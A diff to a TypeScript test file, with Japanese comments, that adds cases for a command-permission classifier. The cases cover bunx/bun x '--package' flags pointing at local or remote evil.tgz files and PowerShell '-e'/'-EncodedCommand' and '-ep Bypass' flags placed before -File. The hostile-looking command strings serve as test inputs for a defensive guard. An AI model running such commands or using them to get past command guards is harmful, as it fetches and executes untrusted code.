@@ -531,9 +531,13 @@ test('A2 実行を数え漏らさない: bun の <file>・source・. は実行�
     'npm test; bun run evil.ts', 'npm test; bun x ./evil.ts', 'bun run evil.ts', 'bun x ./evil.ts', 'bun run ./scripts/x', 'bun run $TARGET', 'npm test; bun run ev*',
     // 2026-11-26 shell-rest 差し戻し: bunx も bun x と同じ。@ の例外は x・bunx の「@スコープ/名前」だけ。拡張子は何でもファイルらしい（大文字小文字を問わない）
     'npm test; bunx ./evil.ts', 'bunx ./evil.ts', 'npm test; bunx evil.ts', 'npm test; bunx evil.sh', 'npm test; bun run @evil.ts', 'npm test; bun run @scope/x', 'npm test; bun x @evil.ts',
-    'npm test; bun run evil.sh', 'npm test; bun run evil.wasm', 'npm test; bun run evil.TS', 'npm test; bun x evil.Ts', 'npm test; bunx evil.PY', 'npm test; bun run build.prod'];
+    'npm test; bun run evil.sh', 'npm test; bun run evil.wasm', 'npm test; bun run evil.TS', 'npm test; bun x evil.Ts', 'npm test; bunx evil.PY', 'npm test; bun run build.prod',
+    // 2026-11-26 shell-rest 差し戻し 3: 取ってくる部品を旗で渡す書き方（--package=・-p=・-p・--package）も、先がファイルらしい・何になるか分からないなら実行（旗の値は最初の語でなくなるので、先の tsc だけを見ない）
+    'npm test; bunx --package=./evil.tgz tsc', 'npm test; bunx -p=./evil.tgz tsc', 'npm test; bunx -p ./evil.tgz tsc', 'npm test; bunx --package ./evil.tgz tsc', 'npm test; bunx --package=$P tsc', 'npm test; bunx --package=ev*.tgz tsc',
+    'npm test; bun x --package=./evil.tgz tsc', 'npm test; bunx --bun --package=evil.tgz tsc', 'npm test; bunx --package=https://example.com/evil.tgz tsc'];
   const command = ['bun test', 'bun run build', 'bun x tsc', 'bun x @biomejs/biome', 'bun --version', 'bun -v; npm test', 'npm -v; bun --version', 'npx tsx run.ts', 'npm test',
-    'bun x cowsay@1.5.0', 'bunx cowsay@1.5.0', 'bunx @biomejs/biome@1.8.0', 'npm test; bunx tsc', 'npm test; bunx --bun vite', 'bunx vitest run', 'npm test; bun x @biomejs/biome', 'npm test; bunx @biomejs/biome'];
+    'bun x cowsay@1.5.0', 'bunx cowsay@1.5.0', 'bunx @biomejs/biome@1.8.0', 'npm test; bunx tsc', 'npm test; bunx --bun vite', 'bunx vitest run', 'npm test; bun x @biomejs/biome', 'npm test; bunx @biomejs/biome',
+    'npm test; bunx --package=typescript tsc', 'npm test; bunx -p=typescript tsc', 'npm test; bunx --package=@scope/pkg tsc', 'npm test; bunx --package=typescript@5.0.0 tsc', 'npm test; bunx --package=@scope/pkg@1.2.3 tsc', 'npm test; bun x --package=typescript tsc'];
   const shown = ['node run.ts; npm -v', 'node run.ts'];
   const wrong: string[] = [];
   for (const shell of SCOPE_SHELLS) {
@@ -585,7 +589,9 @@ test('S2 Import-Module・ipmo の先がファイルらしいときは持ち主�
 test('S5 pwsh・powershell の -File の前に -Command・-EncodedCommand などがあれば持ち主。-NoProfile・-nop -ep Bypass など許す旗だけなら files（今のまま）', t => {
   const files = { 'x.ps1': "Write-Output 'x'\n" };
   const owner = ['-Command "Write-Output x" -File x.ps1', '-c "x" -File x.ps1', '-WindowStyle Hidden -File x.ps1', '-NoProfile -Command "x" -File x.ps1',
-    '-ep -File x.ps1', '-ep $p -File x.ps1', '-ExecutionPolicy -Command -File x.ps1', '-nop:$false -File x.ps1', '--test -File x.ps1', '$x -File x.ps1'];
+    '-ep -File x.ps1', '-ep $p -File x.ps1', '-ExecutionPolicy -Command -File x.ps1', '-nop:$false -File x.ps1', '--test -File x.ps1', '$x -File x.ps1',
+    // -e は -EncodedCommand（-ExecutionPolicy の頭だけの書き方は -ex 以上）。-e の値は実行する文なので、x.ps1 は見せない
+    '-e AAAA -File x.ps1', '-e Bypass -File x.ps1', '-E Bypass -File x.ps1', '-nop -e Bypass -File x.ps1'];
   const files_ = ['-NoProfile -File x.ps1', '-nop -ep Bypass -File x.ps1', '-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -File x.ps1', '-noni -nol -ex RemoteSigned -File x.ps1', '-NOPROFILE -fi x.ps1', '-File x.ps1'];
   const wrong: string[] = [];
   for (const shell of SCOPE_SHELLS) {
@@ -598,4 +604,15 @@ test('S5 pwsh・powershell の -File の前に -Command・-EncodedCommand など
     }
   }
   assert.deepEqual(wrong, []);
+});
+
+// 2026-11-26 shell-rest 差し戻し 3: -e は、字句の読み取りが先に -EncodedCommand（読めない包み）として止める。pwshFlagsOk の -e の扱い（-ex 以上だけが -ExecutionPolicy）は、字句を通さずに組み立てた文で確かめる
+test('S5 pwshFlagsOk: -File の前の -e は -ExecutionPolicy でない（-ep・-ex 以上が -ExecutionPolicy）。字句を通さずに組み立てた文でも持ち主', t => {
+  const r = selfRunRig(t, c => { c.tools.shell.shell = 'bash'; }, { 'x.ps1': "Write-Output 'x'\n" });
+  const fact = (...words: string[]) => ({ program: words[0]!, programDynamic: false, programOdd: false, words: words.map(text => ({ text, dynamic: false, glob: false, quoted: false, home: false, kind: 'plain' })), urls: [], env: [], gitGlobal: [], code: [], codeDynamic: false, stdin: false, shapes: [], reasonKeys: [], deletes: false, targets: [], writes: [], cwd: r.ws, inner: undefined });
+  const kindOf = (...words: string[]) => filesScopeOf([fact(...words) as never], ['code.file_run'], r.ws).kind;
+  for (const program of ['pwsh', 'powershell']) {
+    assert.deepEqual([['-e', 'Bypass'], ['-E', 'Bypass'], ['-e', 'AAAA'], ['-nop', '-e', 'Bypass']].map(lead => kindOf(program, ...lead, '-File', 'x.ps1')), ['owner', 'owner', 'owner', 'owner']);
+    assert.deepEqual([['-ep', 'Bypass'], ['-ex', 'Bypass'], ['-ExecutionPolicy', 'Bypass'], ['-nop', '-ep', 'Bypass']].map(lead => kindOf(program, ...lead, '-File', 'x.ps1')), ['files', 'files', 'files', 'files']);
+  }
 });
